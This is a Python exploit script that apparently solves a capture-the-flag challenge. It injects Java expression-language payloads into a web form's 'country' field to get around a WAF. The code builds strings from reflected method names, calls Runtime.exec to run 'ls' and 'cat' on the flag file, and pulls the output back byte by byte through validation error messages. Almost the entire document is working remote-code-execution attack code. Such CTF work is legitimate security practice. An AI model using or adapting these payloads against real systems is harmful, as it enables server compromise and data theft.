import json
import time
import httpx

URL = "http://frog-waf.chals.sekai.team/"
ALL_METHODS = []


def get_parenthesis(number):
    """ 
        I use the [] and size to bypass the number check
        [NUMBER*[]].getSize()
    """
    string = "["
    if number == 1:
        string += "[]"
    elif number > 0:
        string += "[],"*(number-1) + "[]"
    string += "].size()"
    return string


def exploit(payload):
    """ Use the payload to exploit """
    data = {
        'firstName': 'Aaaa',
        'lastName': 'Aaaa',
        'description': 'Aaaa',
        'country': payload
    }
    return json.loads(httpx.post(URL + "/addContact", json=data).text)["violations"][0]['message']


def get_all_methods(DEBUG=False):
    """ Get all the methods """
    dictio = {}

    # Get from some parts
    for a in ["Object", "[]", "Integer"]:
        dictio[a] = {}
        for i in range(1,300):
            payload = "${" + a + ".getClass().getMethods()[[" 
            if i == 1:
                payload += "[]"
            elif i > 0:
                payload += "[],"*(i-1) + "[]"
            payload += "].size()].toString()}"
            if DEBUG: 
                print(payload)
            try:
                r = exploit(payload)
                if DEBUG:
                    print(len(r))
            except Exception:
                break

            if len(r) == 23:
                break
            else:
                value = r[:r.find(" is not a valid country")]
                # {'method': 'payload'}
                dictio[a][value] = payload
    
    return dictio

def search(term, DEBUG=False):
    """
        It receives a string and builds the payload to get that string
        For that tries to find the greater substring and if not
        divides the string in parts
    """
    search = term
    found = False
    payload = []
    found_word = ""
    toUpper = False
    while not found:
        for primitive in ALL_METHODS:
            for value in ALL_METHODS[primitive]:
                if DEBUG:
                    print(f"""
                    #####
                    term: {term}
                    search: {search}
                    found_word: {found_word}
                    value: {value}
                    #####
                    """)
                # "Nam" in "public getName()" 
                if search in value:
                    if DEBUG:
                        print("=============")
                        print("FOUND")
                        print(f"{search} in {value}")
                        print("=============")
                    ind = value.find(search)
                    init = ind
                    end = ind + len(search)
                    # public... getName
                    exp = ALL_METHODS[primitive][value][:-1] + f".substring({get_parenthesis(init)},{get_parenthesis(end)})"
                    result = exploit(str(exp)+"}")
                    if search not in result:
                        print(result)
                        input()
                    

                    # If uppercase
                    if toUpper:
                        toUpper = False
                        exp += ".toUpperCase()"
                        search = search.upper()

                    payload.append(exp)
                    found_word += search
                    search = term[term.find(found_word)+len(found_word):]

                    if found_word == term:
                        return payload

                #time.sleep(0.5)
                    
        if found_word == term:
            return payload

        if len(search) > 1:
            search = search[:-1] 
            if len(search) == 1 and search.isupper():
                search = search.lower()
                toUpper = True

        else:
            if search.isdigit():
                # IF IS A INTEGER WE CAN USE PARENTHESIS
                exp = "${" + get_parenthesis(int(search)) + ".toString()"
                payload.append(exp)
                found_word += search
                if DEBUG:
                    print(f"[*] Taking the value {search} from parenthesis")
                search = term[term.find(found_word)+len(found_word):]
            else: 
                print(f"We can't get the following char: {search}")
    return payload


def get_payload(string, DEBUG=False):
    """
        It receives a string and builds the payload to get that string
        For that tries to find the greater substring and if not
        divides the string in parts and concatenates the different parts 
        with 'concat'
    """
    init_exploit = ""
    exploit_list = search(string)

    for idx, min in enumerate(exploit_list):
        if DEBUG:
            print(f"""
                String: {string}
                Exploit: {exploit(min + "}")}
                """)
            # input()
        if idx == 0:
            # found all the key in one  method 
            # ls -> ....equals
            if idx == (len(exploit_list)-1):
                init_exploit = min[2:]
            else: 
                init_exploit = min[2:] + ".concat("

        elif idx == (len(exploit_list)-1):
            init_exploit += min[2:] + ")"
        else:
            init_exploit += min[2:] + ").concat("

    return init_exploit

def get_functions(name):
    result = ""
    for i in range(200):
        init = "${Object.getClass()[" + str(get_payload('forName')) + "](" + str(get_payload('java.lang.' + name)) + ").getMethods()[" + str(get_parenthesis(i)) + "]}"
        result = exploit(init).strip(" is not a valid country")
        print(f"""
            Number: {i}
            Result: {result}
        """)

def get_ls():
    result = ""
    for i in range(200):
        init = "${Object.getClass()[" + str(get_payload('forName')) + "](" + str(get_payload('java.lang.Runtime')) + ").getMethods()[[[],[],[],[],[],[]].size()].invoke(null).exec(" + str(get_payload('ls')) + ").inputStream.readAllBytes()[" + str(get_parenthesis(i)) + "]}"
        result += chr(int(exploit(init).strip(" is not a valid country"))).replace("\n", " ")
        print(f"""
            Number: {i}
            Result: {result}
        """)
def get_hyphen(DEBUG=False):
    """ get hyphen ('-') from getenv()"""

    # Number 23 of java.lang.System is getenv() -> '-'
    init = "Object.getClass()[" + str(get_payload('forName')) + "](" + str(get_payload('java.lang.System')) + ").getMethods()[" + str(get_parenthesis(23)) + "].invoke(null).toString().substring(" + str(get_parenthesis(69)) + "," + str(get_parenthesis(70)) + ").toString()"
    if DEBUG:
        print(exploit("${" + init + "}"))
    return init

def get_flag():
    """ exec(cat flag-123.txt) """
    result = ""
    for i in range(200):
        init = "Object.getClass()[" + str(get_payload('forName')) + "](" + str(get_payload('java.lang.Runtime')) + ").getMethods()[[[],[],[],[],[],[]].size()].invoke(null).exec(" + str(get_payload('cat flag')) + ".concat(" + str(get_hyphen()) + ").concat(" + str(get_payload('a6cd856505af7f809c24be3ccdfe5faf.txt')) + ")).getInputStream().readAllBytes()[" + str(get_parenthesis(i))  + "]"
        result += chr(int(exploit("${" + init + "}").strip(" is not a valid country")))
        print(f"""result: {result} """, end='\r')

        if result[-1] == '}':
            print(f"""\n\n============ CONGRATS =============\nFlag: {result}""")
            break



def get_rce():
    global ALL_METHODS

    # ==========
    # Get all the possible character we could use
    # exfiltrating available methods/functions
    # ==========
    ALL_METHODS = get_all_methods()
    
    # Add to ALL_METHODS from env
    key = "env"
    payload = "${Object.getClass()[" + str(get_payload('forName')) + "](" + str(get_payload('java.lang.System')) + ").getMethods()[" + str(get_parenthesis(23)) + "].invoke(null).toString()}"
    r = exploit(payload)
    value = r[:r.find(" is not a valid country")]
    ALL_METHODS[key] = {} 
    ALL_METHODS[key][value] = payload


    # ============= FUNCTION TO LAUNCH A 'ls'
    # Flag: flag-a6cd856505af7f809c24be3ccdfe5faf.txt
    # get_ls()
    # ============= FUNCTION TO GET '-' from system.getenv()
    # hyphen = get_hyphen()
    # print(exploit("${" + hyphen + "}"))
    # ============= FUNCTION TO EXEC 'cat flag-a6cd856505af7f809c24be3ccdfe5faf.txt'
    get_flag()



# ==========
# Check that exist 
# ==========
# Method to run one 
#r = exploit('${[].getClass().getMethods()[[].size()].toString()}')
#print(r)

# ==========
# Print methods of a particular call 
# ==========
# get_functions('StrictMath')

# ==========
# Exfiltrate flag
# exec(cat flag-1asd123.txt)
# ==========
get_rce()
